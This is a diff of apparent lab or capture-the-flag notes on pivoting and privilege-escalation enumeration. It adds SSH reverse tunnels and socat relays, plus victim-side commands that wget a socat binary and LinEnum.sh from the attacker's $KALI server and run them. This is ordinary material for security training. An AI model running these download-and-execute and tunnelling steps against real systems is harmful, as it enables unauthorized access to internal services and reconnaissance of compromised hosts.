@@ -283,37 +283,49 @@ ss -ltp
 
 <figure><img src="../../.gitbook/assets/image (1159).png" alt=""><figcaption></figcaption></figure>
 
-
-
-## try later
+### Option 1 - Failed
 
 **Kali**
 
 ```
-ssh tunneluser@ServerA -R 8888:thmdc.za.tryhackme.com:80
+ssh manager@$VICTIM -R 3000:0.0.0.0:3000
 ```
 
-## or maybe this
+**/etc/ssh/sshd\_config**
 
-**Kali**
+**If I had permission to this file I could modify these settings to see the website as localhost on Kali.**
 
-Copy
+```
+AllowTcpForwarding yes
+GatewayPorts yes
+```
+
+### Option 2 - Works&#x20;
+
+**Kali 1**&#x20;
 
 ```
 wget https://github.com/aledbf/socat-static-binary/releases/download/v0.0.1/socat-linux-amd64
-python2 -m SimpleHTTPServer 81
+python2 -m SimpleHTTPServer 82
 ```
 
 **Victim**
 
-Copy
-
 ```
 cd /tmp
-wget http://$KALI:81/socat-linux-amd64
+wget http://$KALI:82/socat-linux-amd64
 chmod +x socat-linux-amd64 
-./socat-linux-amd64  tcp-listen:7777,reuseaddr,fork tcp:localhost:6666
+./socat-linux-amd64 TCP-LISTEN:8888,fork TCP:0.0.0.0:3000
 ```
+
+**Kali 2**&#x20;
+
+```
+chmod +x socat-linux-amd64 
+./socat-linux-amd64 TCP-LISTEN:9999,fork TCP:10.10.19.27:8888
+```
+
+<figure><img src="../../.gitbook/assets/image (1160).png" alt=""><figcaption></figcaption></figure>
 
 ## Unit 5 - Automating scripts
 
@@ -347,6 +359,22 @@ Now, as you have two tools on the box, try running both of them and see if eithe
 _Please note: It's always a good idea to run multiple scripts separately and compare their output, as far as each one of them has their own specific scope of exploration._
 
 
+
+**Kali**
+
+```
+wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+python2 -m SimpleHTTPServer 82
+```
+
+**Victim**
+
+```
+cd /tmp
+wget http://$KALI:82/LinEnum.sh
+chmod +x LinEnum.sh
+./LinEnum.sh
+```
 
 
 
